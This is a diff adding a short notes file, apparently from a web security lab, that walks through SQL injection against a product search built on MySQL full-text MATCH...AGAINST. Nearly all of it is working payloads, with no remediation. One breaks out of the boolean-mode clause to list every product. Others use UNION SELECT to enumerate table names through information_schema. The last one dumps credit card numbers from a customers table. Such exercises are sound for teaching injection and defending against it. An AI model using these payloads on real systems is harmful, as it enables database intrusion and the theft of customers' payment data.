@@ -1,0 +1,22 @@
+Assumption: to show the products in product search the following query is used
+
+SELECT * FROM product WHERE match(name) against('our query '  IN BOOLEAN MODE) ;
+
+Query wich shows all products
+'IN BOOLEAN MODE) OR ''=''  OR match(name) against('
+
+'IN BOOLEAN MODE) OR ''='' UNION SELECT 1,1,1,1,1 FROM users WHERE 1=1 OR match(name) against('
+
+
+
+We remembered, that you can comment the rest with # which made the queries a bit easier:
+
+How the tables are called
+') OR 1=1 UNION SELECT table_name,1,1,1,1 FROM information_schema.tables WHERE table_schema='glocken_emil'#
+
+How tables from colums is called:
+') OR 1=1 UNION SELECT table_name,1,1,1,1 FROM information_schema.tables #
+
+Showing all credit cards:
+
+') OR 1=1 UNION SELECT creditcard,1,1,1,1 FROM customers #
